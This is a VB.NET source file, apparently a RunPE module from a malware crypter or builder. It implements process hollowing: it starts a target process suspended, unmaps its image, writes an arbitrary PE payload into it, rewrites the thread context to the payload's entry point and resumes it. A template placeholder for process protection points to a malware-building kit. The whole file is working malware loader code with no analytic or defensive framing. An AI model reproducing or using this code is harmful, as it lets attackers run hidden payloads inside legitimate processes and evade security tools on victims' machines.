Public Class S_Inject

#Region " API's & Structures "
    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="CreateProcess", CharSet:=System.Runtime.InteropServices.CharSet.Unicode), System.Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function CreateProcess_API(
    ByVal applicationName As String,
    ByVal commandLine As String,
    ByVal processAttributes As System.IntPtr,
    ByVal threadAttributes As System.IntPtr,
    ByVal inheritHandles As Boolean,
    ByVal creationFlags As UInteger,
    ByVal environment As System.IntPtr,
    ByVal currentDirectory As String,
    ByRef startupInfo As STARTUP_INFORMATION,
    ByRef processInformation As PROCESS_INFORMATION) As Boolean
    End Function 'CreateProcess

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="GetThreadContext"), System.Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function GetThreadContext_API(
    ByVal thread As System.IntPtr,
    ByVal context As Integer()) As Boolean
    End Function 'GetThreadContext

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="Wow64GetThreadContext"), System.Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function Wow64GetThreadContext_API(
    ByVal thread As System.IntPtr,
    ByVal context As Integer()) As Boolean
    End Function 'Wow64GetThreadContext

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="SetThreadContext"), System.Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function SetThreadContext_API(
    ByVal thread As System.IntPtr,
    ByVal context As Integer()) As Boolean
    End Function 'SetThreadContext

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="Wow64SetThreadContext"), System.Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function Wow64SetThreadContext_API(
    ByVal thread As System.IntPtr,
    ByVal context As Integer()) As Boolean
    End Function 'Wow64SetThreadContext

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="ReadProcessMemory"), System.Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function ReadProcessMemory_API(
    ByVal process As System.IntPtr,
    ByVal baseAddress As Integer,
    ByRef buffer As Integer,
    ByVal bufferSize As Integer,
    ByRef bytesRead As Integer) As Boolean
    End Function 'ReadProcessMemory

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="WriteProcessMemory"), System.Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function WriteProcessMemory_API(
    ByVal process As System.IntPtr,
    ByVal baseAddress As Integer,
    ByVal buffer As Byte(),
    ByVal bufferSize As Integer,
    ByRef bytesWritten As Integer) As Boolean
    End Function 'WriteProcessMemory

    <System.Runtime.InteropServices.DllImport("ntdll.dll", EntryPoint:="NtUnmapViewOfSection"), System.Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function NtUnmapViewOfSection_API(
    ByVal process As System.IntPtr,
    ByVal baseAddress As Integer) As Integer
    End Function 'NtUnmapViewOfSection

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="VirtualAllocEx"), System.Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function VirtualAllocEx_API(
    ByVal handle As System.IntPtr,
    ByVal address As Integer,
    ByVal length As Integer,
    ByVal type As Integer,
    ByVal protect As Integer) As Integer
    End Function 'VirtualAllocEx

    <System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint:="ResumeThread"), System.Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function ResumeThread_API(
    ByVal handle As System.IntPtr) As Integer
    End Function 'ResumeThread

    <System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack:=1)>
    Private Structure PROCESS_INFORMATION
        Public ProcessHandle As System.IntPtr
        Public ThreadHandle As System.IntPtr
        Public ProcessId As UInteger
        Public ThreadId As UInteger
    End Structure 'PROCESS_INFORMATION

    <System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack:=1)>
    Private Structure STARTUP_INFORMATION
        Public Size_ As UInteger
        Public Reserved1 As String
        Public Desktop As String
        Public Title As String

        Public dwX As Integer
        Public dwY As Integer
        Public dwXSize As Integer
        Public dwYSize As Integer
        Public dwXCountChars As Integer
        Public dwYCountChars As Integer
        Public dwFillAttribute As Integer
        Public dwFlags As Integer
        Public wShowWindow As Short
        Public cbReserved2 As Short
        Public Reserved2 As System.IntPtr
        Public StdInput As System.IntPtr
        Public StdOutput As System.IntPtr
        Public StdError As System.IntPtr
    End Structure 'STARTUP_INFORMATION
#End Region
    Public Shared Function injRun(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean) As Boolean
        For fri As Integer = 1 To 5
            If HandleRun(path, cmd, data, compatible) Then Return True
        Next

        Return False
    End Function 'Run
    Private Shared Function HandleRun(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean) As Boolean
        Dim ReadWrite As Integer
        Dim QuotedPath As String = String.Format("""{0}""", path)

        Dim SI As New STARTUP_INFORMATION
        Dim PI As New PROCESS_INFORMATION

        SI.dwFlags = 0 ' dwFlags = 1 ( Hide ) ' dwFlags = 0 ( Show )
        SI.Size_ = CUInt(System.Runtime.InteropServices.Marshal.SizeOf(GetType(STARTUP_INFORMATION)))

        Try
            If Not String.IsNullOrEmpty(cmd) Then
                QuotedPath = QuotedPath & " " & cmd
            End If

            If Not CreateProcess_API(path, QuotedPath, System.IntPtr.Zero, System.IntPtr.Zero, False, 4, System.IntPtr.Zero, Nothing, SI, PI) Then Throw New System.Exception()

            '%Process_Protection% ProtectProcess(PI.ProcessId)

            Dim FileAddress As Integer = System.BitConverter.ToInt32(data, 60)
            Dim ImageBase As Integer = System.BitConverter.ToInt32(data, FileAddress + 52)

            Dim Context_(179 - 1) As Integer
            Context_(0) = 65538

            If System.IntPtr.Size = 4 Then
                If Not GetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New System.Exception()
            Else
                If Not Wow64GetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New System.Exception()
            End If

            Dim Ebx As Integer = Context_(41)
            Dim BaseAddress As Integer

            If Not ReadProcessMemory_API(PI.ProcessHandle, Ebx + 8, BaseAddress, 4, ReadWrite) Then Throw New System.Exception()

            If ImageBase = BaseAddress Then
                If Not NtUnmapViewOfSection_API(PI.ProcessHandle, BaseAddress) = 0 Then Throw New System.Exception()
            End If

            Dim SizeOfImage As Integer = System.BitConverter.ToInt32(data, FileAddress + 80)
            Dim SizeOfHeaders As Integer = System.BitConverter.ToInt32(data, FileAddress + 84)

            Dim AllowOverride As Boolean
            Dim NewImageBase As Integer = VirtualAllocEx_API(PI.ProcessHandle, ImageBase, SizeOfImage, 12288, 64) 'R1

            'This is the only way to execute under certain conditions. However, it may show
            'an application error probably because things aren't being relocated properly.

            If Not compatible AndAlso NewImageBase = 0 Then
                AllowOverride = True
                NewImageBase = VirtualAllocEx_API(PI.ProcessHandle, 0, SizeOfImage, 12288, 64)
            End If

            If NewImageBase = 0 Then Throw New System.Exception()

            If Not WriteProcessMemory_API(PI.ProcessHandle, NewImageBase, data, SizeOfHeaders, ReadWrite) Then Throw New System.Exception()

            Dim SectionOffset As Integer = FileAddress + 248
            Dim NumberOfSections As Short = System.BitConverter.ToInt16(data, FileAddress + 6)

            For fri As Integer = 0 To NumberOfSections - 1
                Dim VirtualAddress As Integer = System.BitConverter.ToInt32(data, SectionOffset + 12)
                Dim SizeOfRawData As Integer = System.BitConverter.ToInt32(data, SectionOffset + 16)
                Dim PointerToRawData As Integer = System.BitConverter.ToInt32(data, SectionOffset + 20)

                If Not SizeOfRawData = 0 Then
                    Dim SectionData(SizeOfRawData - 1) As Byte
                    System.Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length)

                    If Not WriteProcessMemory_API(PI.ProcessHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ReadWrite) Then Throw New System.Exception()
                End If

                SectionOffset += 40
            Next

            Dim PointerData As Byte() = System.BitConverter.GetBytes(NewImageBase)
            If Not WriteProcessMemory_API(PI.ProcessHandle, Ebx + 8, PointerData, 4, ReadWrite) Then Throw New System.Exception()

            Dim AddressOfEntryPoint As Integer = System.BitConverter.ToInt32(data, FileAddress + 40)

            If AllowOverride Then NewImageBase = ImageBase
            Context_(44) = NewImageBase + AddressOfEntryPoint

            If System.IntPtr.Size = 4 Then
                If Not SetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New System.Exception()
            Else
                If Not Wow64SetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New System.Exception()
            End If

            If ResumeThread_API(PI.ThreadHandle) = -1 Then Throw New System.Exception()
        Catch
            Dim Pros As System.Diagnostics.Process = System.Diagnostics.Process.GetProcessById(CInt(PI.ProcessId))
            If Pros IsNot Nothing Then Pros.Kill()

            Return False


        End Try

        Return True
    End Function 'HandleRun
End Class ' RunPE